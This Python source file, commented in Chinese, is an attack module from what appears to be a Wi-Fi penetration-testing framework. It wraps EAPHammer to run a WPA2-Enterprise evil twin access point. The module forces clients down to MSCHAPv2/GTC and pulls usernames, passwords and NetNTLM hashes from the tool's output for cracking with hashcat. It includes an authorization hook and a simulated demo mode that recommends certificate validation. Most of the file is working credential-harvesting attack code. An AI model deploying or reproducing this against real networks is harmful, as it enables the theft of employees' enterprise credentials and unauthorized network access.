"""企业级 WPA2-EAP 攻击（EAPHammer 封装）."""

from __future__ import annotations

import asyncio
import re
import time
from pathlib import Path

from .base import AttackContext, AttackModule, AttackResult, Option
from ..models import normalize_mac

USER_RE = re.compile(r"(?:username|identity|user)\s*[:=]\s*(\S+)", re.IGNORECASE)
MSCHAP_RE = re.compile(r"\$NETNTLM\$[0-9]+\$[0-9A-Fa-f]+\$[0-9A-Fa-f]+")
CRED_RE = re.compile(r"(?:password|credential)\s*[:=]\s*(\S+)", re.IGNORECASE)


class EnterpriseAttack(AttackModule):
    id = "enterprise"
    name = "企业级 Evil Twin（EAP）"
    category = "enterprise"
    description = (
        "使用 EAPHammer 搭建针对 802.1X/WPA2-Enterprise 的邪恶双胞胎，"
        "诱导客户端降级到 MSCHAPv2/GTC 并捕获认证凭证（可导出 hashcat 5500 格式）。"
    )
    requires = ("eaphammer",)
    risk = "critical"
    needs_monitor = False
    options = [
        Option("timeout", "运行时长（秒）", "int", 300, "等待客户端关联并认证"),
        Option("wpa_version", "WPA 版本", "select", "2", "与目标保持一致", ["2", "3"]),
        Option("essid", "伪造 SSID", "text", "", "留空则使用目标 SSID"),
        Option("capture_creds", "仅收割凭证", "bool", True, "EAPHammer --creds 模式"),
    ]

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("essid") or params.get("ssid") or "CORP-WiFi"
        channel = int(params.get("channel") or 6)
        timeout = max(30, int(params.get("timeout") or 300))
        ctx.authorize("enterprise", bssid, ssid)
        ctx.emit("attack", f"企业级 Evil Twin：{ssid} · ch{channel} · {timeout}s", bssid=bssid)

        if ctx.demo:
            return await self._demo(ctx, params, bssid, ssid, channel, started)

        iface = await ctx.iface_mgr.resolve(ctx.config.iface)
        if not iface:
            raise RuntimeError("未找到可用无线网卡")
        cmd = [
            "eaphammer",
            "-i", iface.name,
            "--essid", ssid,
            "--channel", str(channel),
            "--auth", "wpa-eap",
            "--wpa-version", str(params.get("wpa_version") or "2"),
        ]
        if params.get("capture_creds", True):
            cmd.append("--creds")
        ctx.emit("info", f"启动 EAPHammer：{' '.join(cmd)}")
        lines: list[str] = []

        def on_line(line: str) -> None:
            lines.append(line)
            ctx.log(f"[eaphammer] {line}")

        proc = await ctx.runner.background(cmd, delay=3.0, on_line=on_line)
        try:
            waited = 0
            while waited < timeout:
                await asyncio.sleep(2)
                waited += 2
                if waited % 30 == 0:
                    ctx.emit("debug", f"等待企业客户端认证… {waited}/{timeout}s")
        finally:
            await ctx.runner.terminate(proc)

        text = "\n".join(lines)
        users = USER_RE.findall(text)
        hashes = MSCHAP_RE.findall(text)
        passwords = CRED_RE.findall(text)
        cred_id = None
        if users or hashes or passwords:
            from ..models import Credential

            cred_id = ctx.store.add_credential(
                Credential(
                    session_id=ctx.session_id,
                    username=users[0] if users else "",
                    password=passwords[0] if passwords else (hashes[0] if hashes else ""),
                    portal=f"eaphammer:{ssid}",
                    user_agent="802.1X/EAP",
                )
            )
            ctx.finding(
                "企业网络凭证被捕获",
                "critical",
                bssid=bssid,
                ssid=ssid,
                detail=f"用户名={users[:2]}，NetNTLM hash 数量={len(hashes)}。可导入 hashcat -m 5500。",
                category="enterprise",
            )
            ctx.emit("success", f"已捕获企业凭证（记录 #{cred_id}）")
        loot = Path("loot")
        if loot.exists():
            ctx.emit("info", f"EAPHammer loot 目录: {loot.resolve()}")

        return AttackResult(
            ok=bool(proc),
            summary=(
                f"捕获 {len(users)} 个身份 / {len(hashes)} 个 NetNTLM hash"
                if (users or hashes)
                else f"EAPHammer 运行 {int(time.time() - started)}s，未捕获凭证"
            ),
            detail={
                "users": users[:5],
                "hashes": hashes[:5],
                "passwords": passwords[:5],
                "credential_id": cred_id,
                "output": text[-2000:],
            },
            duration=time.time() - started,
        )

    async def _demo(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        started: float,
    ) -> AttackResult:
        steps = [
            "生成 RADIUS 服务端证书（模拟）",
            "启动企业级邪恶双胞胎（模拟）",
            "客户端关联并进入 EAP 协商",
            "EAP 方法被降级到 MSCHAPv2",
            "捕获 Challenge/Response（可导入 hashcat -m 5500）",
        ]
        for step in steps:
            await asyncio.sleep(0.6)
            ctx.emit("info", step, bssid=bssid)
        ctx.finding(
            "企业 Wi-Fi 客户端未校验证书（演示）",
            "critical",
            bssid=bssid,
            ssid=ssid,
            detail="客户端接受伪造 RADIUS 证书并完成 EAP 协商，存在凭证被捕获风险。"
            "建议强制 CA + CN/SAN 校验，禁用 MSCHAPv2/GTC。",
            category="enterprise",
        )
        return AttackResult(
            ok=True,
            summary="企业级 Evil Twin 就绪（模拟），客户端会泄露 MSCHAPv2 响应",
            detail={
                "demo": True,
                "essid": ssid,
                "channel": channel,
                "note": "演示模式不生成虚假凭证，仅展示攻击链与风险结论",
            },
            duration=time.time() - started,
        )
